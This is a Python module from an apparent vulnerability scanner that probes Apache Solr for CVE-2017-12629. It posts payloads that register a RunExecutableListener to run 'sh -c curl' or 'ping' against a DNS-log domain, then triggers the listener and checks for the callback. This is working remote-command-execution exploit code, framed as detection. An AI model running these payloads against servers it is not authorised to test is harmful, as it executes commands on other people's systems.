#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
# from lib.tool import check
from time import sleep

random_name = random_md5()
cve_2017_12629_payloads = [
    {
        'path': 'solr/{DBNAME}/config',
        'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "curl DNSDOMAIN"]}}',
        'path-2': 'solr/{DBNAME}/update',
        'data-2': '[{"id":"test"}]',
    },
    {
        'path': 'solr/{DBNAME}/config',
        'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping -c 4 DNSDOMAIN"]}}',
        'path-2': 'solr/{DBNAME}/update',
        'data-2': '[{"id":"test"}]',
    },
    {
        'path': 'solr/{DBNAME}/config',
        'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping DNSDOMAIN"]}}',
        'path-2': 'solr/{DBNAME}/update',
        'data-2': '[{"id":"test"}]',
    },
    {
        'path': 'config',
        'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "curl DNSDOMAIN"]}}',
        'path-2': 'update',
        'data-2': '[{"id":"test"}]',
    },
    {
        'path': 'config',
        'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping -c 4 DNSDOMAIN"]}}',
        'path-2': 'update',
        'data-2': '[{"id":"test"}]',
    },
    {
        'path': 'config',
        'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping DNSDOMAIN"]}}',
        'path-2': 'update',
        'data-2': '[{"id":"test"}]',
    }
]

def cve_2017_12629_scan(self, clients):
    ''' 7.1.0之前版本总共爆出两个漏洞: XML实体扩展漏洞(XXE)和远程命令执行漏洞(RCE)
            二者可以连接成利用链, 编号均为CVE-2017-12629
    '''
    client = clients.get('reqClient')
    sessid = '60491ea49ab435a2cc1acb7aa93e3409'

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2017-12629',
    }

    headers = {
        'Content-Type': 'application/json'
    }

    self.enable(client)                                         # * 需要获取数据库名称 DBname
    if not self.db_name:
        return None

    dnslog_md = random_md5()                                   # * 随机md5值, 8位
    dnslog_domain = dnslog_md + '.' + dns.domain(sessid)       # * dnslog/ceye域名

    for payload in cve_2017_12629_payloads:
        path = payload['path'].format(DBNAME=self.db_name)
        data = payload['data'].replace('DNSDOMAIN', dnslog_domain)

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue
        
        if ('"WARNING":"This response format is experimental.  It is likely to change in the future."' in res.text):
            path_2 = payload['path-2'].format(DBNAME=self.db_name)
            data_2 = payload['data-2']
            
            res2 = client.request(
                'post',
                path_2,
                data=data_2, 
                headers=headers,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res2 is None:
                continue

            sleep(10)                                    # * solr响应太慢啦!
            if (dns.result(dnslog_md, sessid)):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res,
                    'Request-2': res2
                }
                return results
    return None
